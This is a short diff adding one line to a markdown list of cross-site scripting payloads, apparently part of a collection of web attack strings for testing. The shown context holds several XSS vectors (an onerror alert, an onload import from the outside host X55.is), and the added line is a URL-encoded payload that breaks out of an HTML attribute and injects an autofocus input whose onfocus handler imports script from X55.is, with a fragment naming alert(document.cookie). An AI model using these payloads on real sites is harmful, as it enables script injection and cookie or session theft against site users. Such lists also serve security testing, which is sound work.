@@ -271,6 +271,7 @@ XSS attacks may be conducted without using `<script>...</script>` html tags. Oth
   ';k='e'%0Atop['al'+k+'rt'](1)//
   <Img Src=OnXSS OnError=alert(1)>
   <Img Src=//X55.is OnLoad%0C=import(Src)>
+  2%22%3E%3C!--%3E%3Cinput%20autofocus%20id=//X55.is%20onfocus=import(id)%3E#alert(document.cookie)
   ```
 </details>
 
